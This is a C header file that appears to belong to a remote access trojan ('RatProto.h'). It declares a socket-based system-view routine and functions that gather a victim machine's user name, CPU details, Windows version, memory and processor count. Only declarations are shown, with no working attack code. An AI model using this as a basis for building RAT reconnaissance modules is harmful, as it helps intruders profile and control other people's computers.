#include "Header.h"
#include "RatProto.h"
#include <io.h>
#include <fcntl.h>
#include <shlwapi.h>
#include <objidl.h>
#include <stdio.h>
#include <stdlib.h>


#define CMDNUMS	8
#define REGPATH "HARDWARE\\DESCRIPTION\\SYSTEM\\CENTRALPROCESSOR\\0"
typedef char* (*SYSFUNC)(char*);
typedef BOOL (*PRODUCTINFOFUNC)(DWORD,DWORD,DWORD,DWORD,PDWORD);
extern PRODUCTINFOFUNC GetProductFunc;
extern SYSFUNC SysFunc[CMDNUMS];


//操作系统版本结构体
typedef struct _NEWOSVERSIONINFOEX {
	DWORD dwOSVersionInfoSize;
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	DWORD dwBuildNumber;
	DWORD dwPlatformId;
	TCHAR szCSDVersion[128];
	WORD wServicePackMajor;
	WORD wServicePackMinor;
	WORD wSuiteMask;
	BYTE wProductType;
	BYTE wReserved;
} NEWOSVERSIONINFOEX, *NEWPOSVERSIONINFOEX, *NEWLPOSVERSIONINFOEX;







//////////////////////////////////////////////////////////////////////////
//SYS_VIEW封装函数
//////////////////////////////////////////////////////////////////////////
BOOL SysView(SOCKET sockfd,int dwRecvSize);
//////////////////////////////////////////////////////////////////////////
//SYSINFO获取函数
//////////////////////////////////////////////////////////////////////////
//USER Name
char* GetUserName(char* pData);
//CPU Name
char* GetCpuName(char* pData);
//CPU Type
char* GetCpuType(char* pData);
//Windows Version
char* GetWinVersion(char* pData);
//System Directory
char* GetSysDirectory(char* pData);
//Total Physical Memory
char* GetPhyMemroy(char* pData);
//Number of Processors
char* GetProcessors(char* pData);
//Model
char* GetModel(char* pData);